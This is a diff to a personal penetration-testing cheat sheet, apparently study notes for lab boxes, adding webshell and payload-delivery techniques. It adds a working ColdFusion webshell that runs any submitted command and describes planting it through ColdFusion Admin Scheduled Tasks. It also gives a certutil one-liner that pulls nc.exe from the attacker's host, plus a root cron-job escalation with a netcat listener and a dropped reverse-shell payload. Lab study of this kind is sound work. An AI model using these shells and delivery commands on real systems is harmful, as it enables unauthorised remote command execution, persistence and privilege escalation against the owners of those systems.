@@ -1,4 +1,4 @@
-# Shells & Payloads — Command Appendix
+# Shells & Payloads, Command Appendix
 
 Part of [[COMMAND APPENDIX]]. Webshells, reverse shells, and SSH-based access/persistence.
 
@@ -15,9 +15,24 @@ ls /usr/share/webshells/aspx/      # cmdasp.aspx
 sed -i "s/\$ip = '127.0.0.1';/\$ip = '<your_ip>';/" php-reverse-shell.php
 sed -i "s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
 ```
-See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 (case study 4)]].
+```html
+<!-- Self-referencing CFM webshell (ColdFusion), submits to itself and runs the cmd field -->
+<html><body><cfoutput>
+<form method="POST" action="shell.cfm">
+<input type=text name="cmd" size=80
+  <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>>
+<input type=submit value="Exec">
+</form>
+<cfif isdefined("form.cmd")>
+<cfexecute name="#Form.cmd#" arguments="" timeout="5"></cfexecute>
+</cfif>
+</cfoutput></body></html>
+```
+*The CFM shell above needs a way onto the target's own web root to be reachable. On ColdFusion Admin specifically, its Scheduled Tasks feature will fetch a URL and save the response to a file you choose, an easy way to drop the shell without any file-upload vector at all: point a new scheduled task's URL at your hosted `shell.cfm`, set "Save output to file" to a path under the app's own `wwwroot`, then run it once.*
 
-#### Tags: #Webshells #PHPWebshell #ASPNETWebshell
+See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 (case study 4)]], [[Arctic|Arctic box writeup]] (the CFM shell, delivered via ColdFusion's Scheduled Tasks).
+
+#### Tags: #Webshells #PHPWebshell #ASPNETWebshell #CFMWebshell #ScheduledTask
 
 ---
 
@@ -74,6 +89,31 @@ ssh-keygen -p -m PEM -f <keyfile>
 See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] (the libcrypto troubleshooting saga), [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (planting a key via upload+traversal).
 
 #### Tags: #SSH #SSHKeyTheft #SSHKeyPlanting #LibcryptoTroubleshooting
+
+---
+
+## Delivering a Payload Without Direct Upload Access
+
+Two patterns worth having as reflexes when there's no file-upload form to abuse directly, but there's another way to get a file to run.
+
+```cmd
+:: certutil, a Microsoft-signed binary that ships on every Windows install by default,
+:: repurposed as a downloader (LOLBIN). No upload tool needed on the target beforehand,
+:: the "downloader" is already sitting there.
+cmd.exe /c certutil -urlcache -split -f "http://<your_ip>/nc.exe" C:\ProgramData\nc.exe
+```
+```bash
+# A root-owned cron job that runs every file in a writable directory, drop a payload
+# and wait for the timer, don't execute it yourself (that only gets you a shell as your
+# own low-priv user, not root). Watch for the dotfile-exclusion gotcha: a bash glob like
+# *.py never matches a leading-dot filename, so the payload's name must NOT start with a dot.
+nc -lnvp <port>                                    # listener, start this first
+echo "<reverse shell payload>" > /path/to/watched/dir/shell.py   # no leading dot
+# wait up to the cron interval (often ~60s), then check the listener
+```
+See [[Arctic|Arctic box writeup]] (`certutil` pulling down `nc.exe` and `JuicyPotato.exe`), [[Bashed|Bashed box writeup]] (the root cron job iterating `*.py`), [[Privilege Escalation & Local Exploitation (Breakdowns)|Command Breakdowns]] for the full mechanics of both.
+
+#### Tags: #Certutil #LOLBIN #CronPrivesc #DotfileExclusion
 
 ---
 
